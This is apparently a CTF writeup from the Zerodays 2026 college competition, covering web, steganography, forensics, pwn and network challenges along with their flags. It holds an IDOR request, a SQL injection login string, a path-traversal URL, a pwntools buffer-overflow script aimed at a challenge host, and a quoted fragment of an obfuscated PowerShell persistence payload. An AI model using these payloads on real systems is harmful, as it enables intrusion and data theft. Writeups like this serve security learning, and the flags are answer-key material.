---
title: "Zerodays CTF 2026 — Writeup"
date: 2026-03-22 00:00:00 +0000
categories: [Writeups, CTF]
tags: [web, steganography, forensics, pwn, network, pcap, idor, sql-injection, path-traversal, stegseek, zsteg, pwntools, xor, buffer-overflow, zerodays, ireland]
image:
  path: /assets/images/zerodays-ctf/tuffpigeon-challenge.png
  alt: Zerodays CTF 2026 — Tuff Pigeon challenge
---

Zerodays is The Irish Colleges Cyber-Security Challenge, held every year at Croke Park in Dublin. Teams of four compete across web, forensics, crypto, pwn, stegano, and network categories. This year's edition ran on March 22, 2026.

I played as **en2eavor**.

---

## Tuff Pigeon — WarmUp

Three web steps, each giving one token fragment. Concatenate them for the flag.

<img src="/assets/images/zerodays-ctf/tuffpigeon-challenge.png" alt="Tuff Pigeon challenge overview" style="border-radius: 10px; width: 100%;" />

**Step 1 — IDOR.** The URL passes `?user=guest`. Change it to `admin`:

```
https://tuffpigeon.zerodays.events/step1.php?user=admin
```

`token1 = id0r!`

**Step 2 — SQL injection.** Enter `u' OR 1=1;#` in the username field. The query short-circuits and returns the second token.

`token2 = th4nks`

**Step 3 — Path traversal.** Need to read `/opt/challenge/step3_token.txt`. Chain enough `../` to escape the web root:

```
https://tuffpigeon.zerodays.events/step3.php?file=../../../../../../../../opt/challenge/step3_token.txt
```

<img src="/assets/images/zerodays-ctf/tuffpigeon-pathtraversal.png" alt="Path traversal result" style="border-radius: 10px; width: 100%;" />

Submit all three parts:

<img src="/assets/images/zerodays-ctf/tuffpigeon-submit.png" alt="Token submission" style="border-radius: 10px; width: 100%;" />

---

## They dont know — Stegano

JPG file, so `steghide` is the natural first guess. I used `stegseek` with `rockyou` — it's faster and handles empty passphrases automatically:

```shell
➜ stegseek chall.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "flag.txt".
[i] Extracting to "chall.jpg.out".

➜ cat chall.jpg.out
ZeroDays{st3gh1de_f0r-hid1ng_flagz!}
```

Empty passphrase. `stegseek` found it in seconds.

---

## One Does Not Simply — Stegano

PNG file, so `zsteg` first:

```shell
➜ zsteg challenge.png
meta mxfile   .. text: "%3Cmxfile%20host%3D%22app.diagrams.net%22..."
```

The output is URL-encoded and long. I dropped it into CyberChef to decode. After URL-decoding, there's a code block with a long Base64 string inside. Decode it and you get an image with the flag on it.

```
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&oeol=VT
```

---

## Shark Attack — WarmUp

PCAP file. Open in Wireshark, follow the stream — the traffic shows someone downloading a file called `baby.gif` over FTP.

<img src="/assets/images/zerodays-ctf/sharkattack-pcap-stream.png" alt="Following the FTP stream in Wireshark" style="border-radius: 10px; width: 100%;" />

Export it via **File → Export Objects → FTP-DATA**:

<img src="/assets/images/zerodays-ctf/sharkattack-export-ftpdata.png" alt="Exporting FTP data objects" style="border-radius: 10px; width: 100%;" />

The flag is printed on the image.

---

## Nyan Logger — Forensics

Windows Event Viewer file (`.evtx`). Open it on Windows and filter for PowerShell event ID **4104** (ScriptBlock logging).

The logged script is a full persistence payload: creates a hidden directory, kills real-time monitoring in Defender, registers a new local user, drops them into a privileged group, and sets up a scheduled task at logon. Every string is XOR-obfuscated.

The password variable is what leads to the flag:

```powershell
$pass = ConvertTo-SecureString $($k5517=192;$b=[byte[]](0x96,0xf2,0xf1,0x97,...);
    -join($b|%{[char]($_-bxor$k5517)})) -AsPlainText -Force
```

Key is `192`. XOR each byte with it:

```python
k = 192
b = [0x96,0xf2,0xf1,0x97,0xa5,0x97,0x89,0xb7,0x95,0xad,0xa8,0xac,
     0x97,0x85,0xf4,0xf3,0x95,0xac,0xa8,0x9a,0xa5,0xac,0x92,0xb5,
     0x95,0xad,0x9a,0x95,0x92,0x85,0x8a,0xb5,0x97,0xae,0xb0,0x87,
     0xa4,0x96,0xaf,0xb8,0x8f,0x88,0xa8,0x8e,0x92,0x85,0x9a,0xad,
     0x94,0xad,0xb0,0xab,0x8f,0x91,0xfd,0xfd]

print(''.join(chr(x ^ k) for x in b))
# V21WeWIwUmhlWE43UlhZelRuUmZUREJuWnpGdVoxOHhNREZmTmpkOQ==
```

That's Base64 of Base64. Decode twice:

```shell
➜ echo -ne V21WeWIwUmhlWE43UlhZelRuUmZUREJuWnpGdVoxOHhNREZmTmpkOQ== | base64 -d | base64 -d
ZeroDays{Ev3Nt_L0gg1ng_101_67}
```

---

## Trolling — Misc

The file is named `.png` but it is not valid PNG. A hex editor shows it starts with the ASCII string `"get trolled"`, some garbage bytes, then actual JPEG data starting at offset `0x14`.

Strip the fake header and write a clean JPEG:

```python
data = open('chall.png', 'rb').read()
jpeg_data = b'\xff\xd8' + data[0x14:]
open('fixed.jpg', 'wb').write(jpeg_data)
```

<img src="/assets/images/zerodays-ctf/trolling-fixed.png" alt="Repaired JPEG with the flag" style="border-radius: 10px; width: 100%;" />

Flag's on the image.

---

## Pwn Training — Pwn

`signal(SIGSEGV, crash_win)` is set at the top of `main`. A segfault normally kills the process — here it calls `crash_win()`, which prints the flag. So all we need is a crash.

```c
int overflow()
{
  char s[208]; // [rsp+0h] [rbp-D0h] BYREF

  puts("Coach: Remember your training.");
  puts("Coach: Just spam A's and hope for the best");
  gets(s);
  if (strchr(s, 65))
  {
    puts("Coach: Come on. That is skid stuff.");
    exit(0);
  }
  return puts("Coach: nice try, but you cant even crash this binary.");
}
```

`strchr(s, 65)` exits if it finds `'A'` (ASCII 65) in the input. So don't use `A`. Fill with `B` instead — `gets()` has no length check, so blowing past the 208-byte buffer plus saved RBP is enough to segfault:

```python
from pwn import *

binary = './chall'
elf = ELF(binary, checksec=False)
offset = 0xd0 + 8
payload = b'B' * (offset + 8)

target = remote('teatime.zerodays.events', 4244)
target.sendline(payload)
target.interactive()
```

```
[+] Opening connection to teatime.zerodays.events on port 4244: Done
Coach: Remember your training.
Coach: Just spam A's and hope for the best
Coach: nice try, but you cant even crash this binary.
ZeroDays{c0ngratz_y0u_ar3_n0t_a_pwN_sK1d}
```

---

## ProGlovver — Network

PCAP file. Following UDP and TCP streams turns up a DNS TXT record with something that looks like a flag. It doesn't work — troll flag.

<img src="/assets/images/zerodays-ctf/proglovver-dns-troll.png" alt="DNS TXT troll flag" style="border-radius: 10px; width: 100%;" />

Dig further and you find suspicious traffic on port 1337:

<img src="/assets/images/zerodays-ctf/proglovver-port1337.png" alt="Suspicious packets on port 1337" style="border-radius: 10px; width: 100%;" />

Go through each stream:

<img src="/assets/images/zerodays-ctf/proglovver-stream1.png" alt="Stream 1" style="border-radius: 10px; width: 100%;" />

<img src="/assets/images/zerodays-ctf/proglovver-stream2.png" alt="Stream 2" style="border-radius: 10px; width: 100%;" />

<img src="/assets/images/zerodays-ctf/proglovver-stream3.png" alt="Stream 3" style="border-radius: 10px; width: 100%;" />

Piece the fragments together manually:

`ZeroDays{T_C_P_0v3rl4p_1s_3v1l}`

---

## Schizo Steg — Stegano

Two files: `challenge.png` and `hint.png`.

`hint.png` has exactly 16 colors, which matches the number of hex digits. Each pixel in `challenge.png` is one of those 16 colors, and each color maps to one nibble (0–F):

| Nibble | Color | RGB |
|--------|-------|-----|
| 0 | black | (0, 0, 0) |
| 1 | navy | (0, 0, 128) |
| 2 | olive | (128, 128, 0) |
| 3 | grey | (128, 128, 128) |
| 4 | maroon | (128, 0, 0) |
| 5 | magenta | (170, 0, 170) |
| 6 | orange | (255, 128, 0) |
| 7 | salmon | (255, 128, 128) |
| 8 | green | (0, 128, 0) |
| 9 | teal | (0, 170, 170) |
| A | lime | (128, 255, 0) |
| B | light-green | (128, 255, 128) |
| C | violet | (143, 0, 248) |
| D | lavender | (128, 128, 255) |
| E | light-yellow | (255, 255, 128) |
| F | white | (255, 255, 255) |

Read pixels left-to-right, top-to-bottom. Every pair of nibbles is one byte. Script:

```python
#!/usr/bin/env python3
import numpy as np
from PIL import Image

PALETTE = [
    (0,   0,   0),    (0,   0,   128),  (128, 128, 0),   (128, 128, 128),
    (128, 0,   0),    (170, 0,   170),  (255, 128, 0),   (255, 128, 128),
    (0,   128, 0),    (0,   170, 170),  (128, 255, 0),   (128, 255, 128),
    (143, 0,   248),  (128, 128, 255),  (255, 255, 128),  (255, 255, 255),
]

COLOR_TO_NIBBLE = {color: idx for idx, color in enumerate(PALETTE)}

img = Image.open("challenge.png").convert("RGB")
arr = np.array(img).reshape(-1, 3)

nibbles = [COLOR_TO_NIBBLE[tuple(px)] for px in arr]
hex_str = "".join(f"{n:x}" for n in nibbles)
print(hex_str)
```

Drop the hex string into CyberChef (From Hex):

<img src="/assets/images/zerodays-ctf/schizosteg-cyberchef.png" alt="CyberChef hex decode" style="border-radius: 10px; width: 100%;" />

<img src="/assets/images/zerodays-ctf/schizosteg-flag.png" alt="Schizo Steg flag" style="border-radius: 10px; width: 100%;" />
